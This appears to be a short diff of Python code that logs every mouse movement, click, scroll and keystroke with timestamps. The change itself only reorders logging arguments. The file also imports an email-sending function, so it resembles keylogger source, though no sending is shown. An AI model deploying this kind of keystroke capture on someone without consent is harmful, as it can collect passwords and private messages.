@@ -7,29 +7,29 @@ from Correo import enviar_correo
 
 def on_move(x, y):
     colocacion = ('{0},{1}'.format(x, y))
-    escribir_accion("Mouse", "Moved", time(), colocacion)
+    escribir_accion(time(), "Mouse", "Moved", colocacion)
 
 def on_click(x, y, button, pressed):
     accion="{0}".format('Pressed' if pressed else 'Released')
-    escribir_accion("Mouse", accion, time(), str(button))
+    escribir_accion(time(), "Mouse", accion, str(button))
 
 def on_scroll(x, y, dx, dy):
     colocacion=('{0}'.format('Down' if dy < 0 else 'Up'))
-    escribir_accion("Mouse", "Scrolled", time(), colocacion)
+    escribir_accion(time(), "Mouse", "Scrolled", colocacion)
 
 def on_press(key):
     try:
-        escribir_accion("Keyboard", "Pressed", time(), key.char)
+        escribir_accion(time(), "Keyboard", "Pressed", key.char)
     except AttributeError:
-        escribir_accion("Keyboard", "Pressed", time(), str(key))
+        escribir_accion(time(), "Keyboard", "Pressed", str(key))
     except TypeError:
         pass
 
 def on_release(key):
     try:
-        escribir_accion("Keyboard", "Release", time(), key.char)
+        escribir_accion(time(), "Keyboard", "Release", key.char)
     except AttributeError:
-        escribir_accion("Keyboard", "Release", time(), str(key))
+        escribir_accion(time(), "Keyboard", "Release", str(key))
     except TypeError:
         pass
 
